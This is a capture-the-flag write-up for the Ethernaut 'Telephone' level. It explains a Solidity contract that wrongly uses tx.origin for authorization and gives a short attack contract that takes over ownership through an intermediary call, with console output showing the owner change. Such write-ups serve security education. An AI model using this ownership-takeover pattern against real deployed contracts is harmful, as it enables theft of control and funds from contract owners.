<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg">

## Target Contract Review
 
Given contarct.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

As usual, we should change the owner address in the contract to our own address. In this senario, there is function which can change owner's address while ```tx.origin``` is not equal to msg.sender. Shortly, tx.origin is global variable refers to the original external account that started the transaction.

So never use ```tx.origin``` method for authorization, another contract can have a method which will call your contract (where the user has some funds for instance) and your contract will authorize that transaction as your address is in ```tx.origin```.
You should use msg.sender for authorization (if another contract calls your contract msg.sender will be the address of the contract and not the address of the user who called the contract).

## Subverting

My attack contract.

```solidity
pragma solidity ^0.6.0;

import './Telephone.sol';

contract Attack{

    address payable owner;
    Telephone _targetcontract;

    constructor(Telephone _taget) public{
        _targetcontract = Telephone(_taget);
        owner = payable(msg.sender);
    }

    function attack() public{
        	_targetcontract.changeOwner(owner);
    }
}
```
For explain the code, we must first know which contract address the target is.Then call ```changeOwner()``` function as **msg.sender** of telephone contract. As a consequence, we will pass the condition.

Learn contract address.
```shell
await contract
n {methods: {…}, abi: Array(3), address: '0x822962fdf052E28fB48a45ACaf9564F46675d8ed', transactionHash: undefined, constructor: ƒ, …}

```
> 0x822962fdf052E28fB48a45ACaf9564F46675d8ed

Deploy the attack contract and enter target's contract address to constructor.

Check owner of the contract before we deploy the attack contractç

```solidity
await contract.owner()
'0x0b6F6CE4BCfB70525A31454292017F640C10c768'
```
<img src="">

Now check the owner again and we solved again.
```solidity
await contract.owner()
'0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b'
```
**_by wasny0ps_**
